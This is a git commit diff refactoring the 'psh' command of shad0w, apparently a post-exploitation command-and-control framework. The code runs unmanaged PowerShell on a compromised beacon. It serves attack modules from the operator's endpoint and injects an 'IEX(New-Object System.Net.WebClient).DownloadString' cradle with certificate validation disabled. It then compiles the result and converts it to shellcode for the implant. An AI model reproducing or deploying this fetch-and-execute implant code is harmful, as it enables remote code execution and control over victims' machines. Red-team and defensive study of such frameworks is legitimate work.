c25db6adb2a6b2f2f01a8a478a7981f4128a13b6
HashtagMarkus <markus.hoefer@codecentric.de>
2020-09-25 06:28:07 -0400

    Refactor psh command. Add warning on missing endpoint parameter

--- lib/commands/psh.py
+++ lib/commands/psh.py
@@ -15,6 +15,8 @@ __description__ = "Run unmanaged powershell on a session"
 __author__ = "@_batsec_"
 
 # identify the task as shellcode execute
+from lib.basecommand import BaseCommand
+
 USERCD_EXEC_ID = 0x3000
 
 # location of psh binary
@@ -96,17 +98,20 @@ def compile_binary():
     os.system("mcs /reference:System.Management.Automation.dll -out:psh.exe main.cs")
     os.chdir(cwd)
 
-def main(shad0w, args):
 
-    raw_args = args
+class PshCommand(BaseCommand):
+    def __init__(self, args):
+        BaseCommand.__init__(self, "psh", args)
 
-    # check we actually have a beacon
-    if shad0w.current_beacon is None:
-        shad0w.debug.log("ERROR: No active beacon", log=True)
-        return
+    def parse_parameters(self):
+        # set the possible arguments
+        self.parser.add_argument("-c", "--command", nargs="+", required=False, help="Powershell command to execute")
+        self.parser.add_argument("-m", "--module", required=False, help="Powershell modules to load")
+        self.parser.add_argument("-l", "--list", required=False, action='store_true', help="List all the available modules")
+        self.parser.add_argument("-i", "--info", required=False, help="Get infomation on a module")
 
-    # usage examples
-    usage_examples = """
+    def get_usage(self):
+        return """
 
 Examples:
 
@@ -118,91 +123,80 @@ psh --list
 psh --info GetHash
 """
 
-    # init argparse
-    parse = argparse.ArgumentParser(prog='psh',
-                                    formatter_class=argparse.RawDescriptionHelpFormatter,
-                                    epilog=usage_examples)
+    def run(self, shad0w):
+        # kinda a hack to make sure we intergrate nice with the shellcode generator
+        donut_args = DummyClass()
 
+        psh_args = ""
 
-    # keep it behaving nice
-    parse.exit = exit
-    parse.error = error
+        if self.args.info:
+            basedir = "/root/shad0w/scripts/"
+            self.args.info = self.args.info + ".ps1"
+            if self.args.info not in os.listdir(basedir):
+                shad0w.debug.error(f"No module with name '{self.args.info}'")
+                return
+            os.system(f"less {basedir + self.args.info}")
+            return
 
-    # set the possible arguments
-    parse.add_argument("-c", "--command", nargs="+", required=False, help="Powershell command to execute")
-    parse.add_argument("-m", "--module", required=False, help="Powershell modules to load")
-    parse.add_argument("-l", "--list", required=False, action='store_true', help="List all the available modules")
-    parse.add_argument("-i", "--info", required=False, help="Get infomation on a module")
+        if self.args.list:
+            modules = os.listdir("/root/shad0w/scripts")
+            shad0w.debug.log(f"{len(modules)} available modules\n", log=True)
+            for module in modules:
+                print("-\t", module.replace(".ps1", ""))
+            return
 
-    # make sure we dont die from weird args
-    try:
-        args = parse.parse_args(args[1:])
-    except:
+        if self.args.module:
+
+            modules = self.args.module.split(',')
+
+            psh_args += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}}; "
+
+            for module in modules:
+                module_path = f"/root/shad0w/scripts/{module}.ps1"
+
+                with open(module_path, "r") as file:
+                    mod_data = file.read()
+
+                serve_path = "/" + random_string()
+                shad0w.debug.log(f"Hosting module '{module}' ({len(mod_data)} bytes) => {serve_path}", log=True)
+                shad0w.beacons[shad0w.current_beacon]["serve"][serve_path] = mod_data
+
+                iex = f"IEX(New-Object System.Net.WebClient).DownloadString(\"https://{shad0w.endpoint}{serve_path}\"); "
+
+                psh_args += iex
+
+        if self.args.command:
+            cmd = ' '.join(self.raw_args[self.raw_args.index("-c") + 1:])
+            psh_args += cmd
+
+        donut_args.param = False
+        donut_args.cls = False
+        donut_args.method = False
+        donut_args.runtime = False
+        donut_args.appdomain = False
+
+        psh_args = encode_string(psh_args).decode()
+
+        write_args(psh_args)
+        compile_binary()
+
+        b64_comp_data = shellcode.generate(PSH_BIN, donut_args, None)
+
+        shad0w.beacons[shad0w.current_beacon]["task"] = (USERCD_EXEC_ID, b64_comp_data)
+        shad0w.beacons[shad0w.current_beacon]["callback"] = psh_callback
         pass
 
-    # show the errors to the user
-    if len(raw_args) == 1:
-        print(error_list)
-        parse.print_help()
+
+def main(shad0w, args):
+
+    # check we actually have a beacon
+    if shad0w.current_beacon is None:
+        shad0w.debug.log("ERROR: No active beacon", log=True)
         return
 
-    # kinda a hack to make sure we intergrate nice with the shellcode generator
-    donut_args = DummyClass()
+    if shad0w.endpoint is None:
+        print(f"\033[1;33mMirror mode: Parameter -e (endpoint) not set. Powershell modules will not work.\033[0m")
 
-    psh_args = ""
-
-    if args.info:
-        basedir = "/root/shad0w/scripts/"
-        args.info = args.info + ".ps1"
-        if args.info not in os.listdir(basedir):
-            shad0w.debug.error(f"No module with name '{args.info}'")
-            return
-        os.system(f"less {basedir + args.info}")
-        return
-
-    if args.list:
-        modules = os.listdir("/root/shad0w/scripts")
-        shad0w.debug.log(f"{len(modules)} available modules\n", log=True)
-        for module in modules:
-            print("-\t", module.replace(".ps1", ""))
-        return
-
-    if args.module:
-
-        modules = args.module.split(',')
-
-        psh_args += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}}; "
-
-        for module in modules:
-            module_path = f"/root/shad0w/scripts/{module}.ps1"
-
-            with open(module_path, "r") as file:
-                mod_data = file.read()
-
-            serve_path = "/" + random_string()
-            shad0w.debug.log(f"Hosting module '{module}' ({len(mod_data)} bytes) => {serve_path}", log=True)
-            shad0w.beacons[shad0w.current_beacon]["serve"][serve_path] = mod_data
-
-            iex = f"IEX(New-Object System.Net.WebClient).DownloadString(\"https://{shad0w.endpoint}{serve_path}\"); "
-
-            psh_args += iex
-
-    if args.command:
-        cmd = ' '.join(raw_args[raw_args.index("-c") + 1:])
-        psh_args += cmd
-
-    donut_args.param = False
-    donut_args.cls = False
-    donut_args.method = False
-    donut_args.runtime = False
-    donut_args.appdomain = False
-
-    psh_args = encode_string(psh_args).decode()
-
-    write_args(psh_args)
-    compile_binary()
-
-    b64_comp_data = shellcode.generate(PSH_BIN, donut_args, None)
-
-    shad0w.beacons[shad0w.current_beacon]["task"] = (USERCD_EXEC_ID, b64_comp_data)
-    shad0w.beacons[shad0w.current_beacon]["callback"] = psh_callback
+    cmd = PshCommand(args)
+    if cmd.parse():
+        cmd.run(shad0w)
